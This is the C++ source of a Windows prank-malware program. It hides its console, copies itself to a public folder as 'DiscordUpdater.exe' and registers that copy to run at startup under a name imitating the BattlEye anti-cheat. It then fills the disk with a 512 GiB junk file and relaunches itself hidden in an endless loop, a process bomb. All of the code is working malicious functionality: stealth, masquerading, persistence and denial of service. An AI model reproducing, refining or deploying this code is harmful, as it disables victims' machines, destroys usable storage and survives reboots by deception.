#include <iostream>
#include <fstream>
#include <windows.h>
#include <string>
#include <cstdlib>
#include <filesystem>
using namespace std;

void SelfExecute()
{
  char exePath[MAX_PATH];
  GetModuleFileNameA(NULL, exePath, MAX_PATH);
  ShellExecuteA(NULL, "open", exePath, NULL, NULL, SW_HIDE);
}

string getNextFileName(const string& basePath)
{
  string filePath = basePath;
  int index = 0;

  while(filesystem::exists(filePath))
  {
    filePath = basePath + to_string(index) + ".txt";
    index++;
  }

  return filePath;
}

void SelfClone(string clonePath)
{
  char exePath[MAX_PATH];
  GetModuleFileNameA(NULL, exePath, MAX_PATH);
  if(filesystem::exists(clonePath))
  {return;}

  ifstream src(exePath, ios::binary);
  ofstream dst(clonePath, ios::binary);

  dst << src.rdbuf();

  src.close();
  dst.close();
}

int main()
{
  const char* username = getenv("USERNAME");
  string folderPath = "C:\\Users\\" + string(username) + "\\Documents\\BattIEye Anti-Cheat";
  string baseFilePath = folderPath + "\\config";
  string clonePath = "C:\\Users\\Public\\Music\\DiscordUpdater.exe";
  //stealth
  HWND hwnd = GetConsoleWindow();
  ShowWindow(hwnd, SW_HIDE);

  char exePath[MAX_PATH];
  GetModuleFileNameA(NULL, exePath, MAX_PATH);
  SelfClone(clonePath);
  SelfExecute();

  // add to startup
  HKEY hKey;
  RegCreateKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL);
  const char* valueName = "BattIEye Anti-Cheat";
  RegSetValueExA(hKey, valueName, 0, REG_SZ, (LPBYTE)clonePath.c_str(), clonePath.size());
  RegCloseKey(hKey);

  CreateDirectory(folderPath.c_str(), NULL);

  string filePath = getNextFileName(baseFilePath);

  ofstream outFile(filePath, ios::binary);
  if(!outFile.is_open())
  {return 1;}

  const long long targetSize = 512LL * 1024 * 1024 * 1024;
  const string data = "trollface\n";
  const size_t dataSize = data.size();

  long long writtenBytes = 0;
  while (writtenBytes < targetSize)
  {
    outFile.write(data.c_str(), dataSize);
    writtenBytes += dataSize;
  }

  outFile.close();

  while(1)
  {SelfExecute();}

  return 0;
}
